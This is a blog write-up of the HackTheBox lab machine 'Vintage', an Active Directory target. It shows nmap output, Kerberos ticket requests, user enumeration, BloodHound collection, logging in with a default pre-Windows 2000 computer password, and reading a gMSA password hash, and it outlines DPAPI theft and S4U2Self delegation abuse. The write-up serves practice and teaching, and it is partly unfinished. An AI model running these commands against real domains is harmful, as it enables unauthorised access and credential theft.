+++
title = "HTB - Vintage"
date = "2025-04-26"
author = "Brainmoustache"
authorTwitter = "Brainmoustache" #do not include @
cover = ""
tags = ["resume", "hackthebox", "Vintage"]
keywords = ["active-directory", ""]
description = "Resume of Vintage from HackTheBox"
showFullContent = false
readingTime = true
hideComments = false
color = "blue"
+++

# HTB - Vintage
## Resume
- Starting by getting information about how to authenticate to the domain
- 

--- 

## Enumeration:
Nmap
```bash
Nmap scan report for 10.129.231.205
Host is up (0.025s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-14 01:37:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
50623/tcp open  msrpc         Microsoft Windows RPC
50639/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-14T01:38:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.80 seconds
```

## User exploit
This box start in an assumed breach scenario. Credentials provided are `P.Rosa:Rosaisbest123`.

One of the first thing we could try is to get information about the target.

`nxc smb 10.129.231.205 -u P.Rosa -p Rosaisbest123`
```bash
SMB         10.129.231.205  445    10.129.231.205   [*]  x64 (name:10.129.231.205) (domain:10.129.231.205) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.231.205  445    10.129.231.205   [-] 10.129.231.205\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED 
```
We see that we get an error stating `STATUS_NOT_SUPPORTED` but also `NTLM:False`. 

It means we won't be able to use NTLM for this box but only Kerberos.

We can confirm by searching the SASL mechanism supported with `ldapsearch`.

> Simple Authentication and Security Layer (SASL) is a framework for authentication and data security in internet protocols.
> 
> Active Directory supports multiple SASL mechanisms for LDAP bind request.
> 
> GSS-SPNEGO normally supports both Kerberos and NTLM. In this case, only Kerberos is available.

`ldapsearch -x -H ldap://10.129.231.205 -b "" -s base "objectclass=*" supportedSASLMechanisms`
```bash
dn:
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
```
You can also use nmap to do the same `nmap -p 389 --script ldap-rootdse <host>`

We can confirm the usage of Kerberos by requesting a service ticket and using it with impacket to retrieve a list of domain users
```bash
impacket-getTGT 'VINTAGE.HTB'/'P.Rosa' -dc-ip 10.129.231.205

export KRB5CCNAME=/home/brainmoustache/hackthebox/vintage/P.Rosa.ccache

impacket-GetADUsers -all -k -no-pass -dc-ip 10.129.231.205 -all -dc-host dc01.vintage.htb vintage.htb/
```
With the last command, we get the following result
```bash
[*] Querying dc01.vintage.htb for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2024-06-08 07:34:54.403955  2025-04-23 08:12:01.460517 
Guest                                                 2024-11-13 09:16:53.833292  2024-06-07 03:52:40.153707 
krbtgt                                                2024-06-05 06:27:35.400481  <never>             
M.Rossi                                               2024-06-05 09:31:08.094234  <never>             
R.Verdi                                               2024-06-05 09:31:08.141099  <never>             
L.Bianchi                                             2024-06-05 09:31:08.172305  <never>             
G.Viola                                               2024-06-05 09:31:08.203614  <never>             
C.Neri                                                2024-06-05 17:08:13.504719  2024-06-08 08:51:15.053249 
P.Rosa                                                2024-11-06 07:27:16.968169  2025-04-23 08:24:50.913605 
svc_sql                                               2025-04-23 08:12:12.710462  <never>             
svc_ldap                                              2024-06-06 09:45:27.881830  <never>             
svc_ark                                               2024-06-06 09:45:27.913095  <never>             
C.Neri_adm                                            2024-06-07 06:54:14.001771  2024-06-07 10:06:11.244607 
L.Bianchi_adm                                         2025-04-23 07:57:59.929245  <never>             
```
Quickly analyzing this output reveals that we are going to target at some point users `C.Neri` and `C.Neri_adm`.

With the credential for `P.Rosa`, we can now run bloodhound with `nxc`

`nxc ldap 10.129.231.205 -d vintage.htb --use-kcache -k --dns-server 10.129.231.205 --bloodhound --collection All`

`-k --use-kcache` and mandatory when using kerberos ticket with `nxc`


![](/img/htb/vintage/blood-fs01.png)


When a new computer account is configured as "pre-Windows 2000 computer", its password is set based on its name (i.e. lowercase computer name without the trailing `$`). When it isn't, the password is randomly generated. ([ref](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers)).

Once an authentication occurs for a pre-Windows 2000 computer, according to [TrustedSec's blogpost](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/), its password will usually need to be changed.
```bash
impacket-getTGT 'VINTAGE.HTB'/'FS01$' -dc-ip 10.129.231.205    
password: fs01
```
Read the `gMsa` account password 
```bash
python3 bloodyAD.py -k --dc-ip 10.129.231.205 --host dc01.vintage.htb -d vintage.htb get object 'GMSA01$' --attr msDS-ManagedPassword
```
Result of the command
```bash
distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:7dc430b95e17ed6f817f69366f35be06
msDS-ManagedPassword.B64ENCODED: sfyyjet8CbAO5HFzqbtcCtYlqyYohprMvCgeztWhv4z/WOQOS1zcslIn9C3K/ucxzjDGRgHJS/1a54nxI0DxzlhZElfBxQL2z0KpRCrUNdKbdHXU/kzFj/i38JFgOWrx2FMIGKrEEIohO3b2fA/U/vlPxw65M+kY2krLxl5tfD1Un1kMCByA1AI4VuR5zxXSfpnzFIxKlo1PKBJUxttMqbRM21I5/aLQnaIDCnr3WaqfU6lLwdGWxoz6XSD3UiqLaW5iDPYYR47kJpnflJgS0TBUBkvd2JiLiOb5CXF1gBgUsbVLtBo/OWW/+lrvEpBtS7QIUFsOKMIaNsKFGtTkWQ==
```

![](/img/htb/vintage/blood-service.png)
balbal

This box is done only with Kerberos ticket

- Computer account in specific group has default password to computer account name
- Getting access to the computer account, we know we have ReadGMSA with Domain Computers group to GMSA01$
- Reading the hash password and using it to add ourself into the SERVICE MANAGERS group
- SVC_SQL is disable, re-enable it and configure the account to be able to asreproast it
- Fetching NPUsers, we can get a ticket and crack it
- Password spray the password to get access with C.Neri account





## Root exploit
- Reading DPAPI secret from the user
- Pivot into c.neri_adm
- S4U2SELF attack
1. Add the user svc_sql into the groupd that we just got `GenericWrite` access to `DelegatedAdmins`.
2. We use this account because C.Neri have `GenericAll` on it. We will be able to add an SPN.
3. Using previously added SPN, we will be able to fetch a TGS and impersonate the user `L.BIANCHI_ADM`


___
## Resources:

| Hyperlink                                                                                                  | Info                                      |
| ---------------------------------------------------------------------------------------------------------- | ----------------------------------------- |
| https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/989e0748-0953-455d-9d37-d08dfbf3998b | SASL Authentication                       |
| https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e1cbe214-d73b-4c58-aad2-bee399ccdfb8 | 3.1.1.3.4.5.2 GSS-SPNEGO                  |
| https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers                              | Pre-Windows 2000 computers                |
| https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/                                 | Diving into pre created computer accounts |
|                                                                                                            |                                           |
|                                                                                                            |                                           |
|                                                                                                            |                                           |





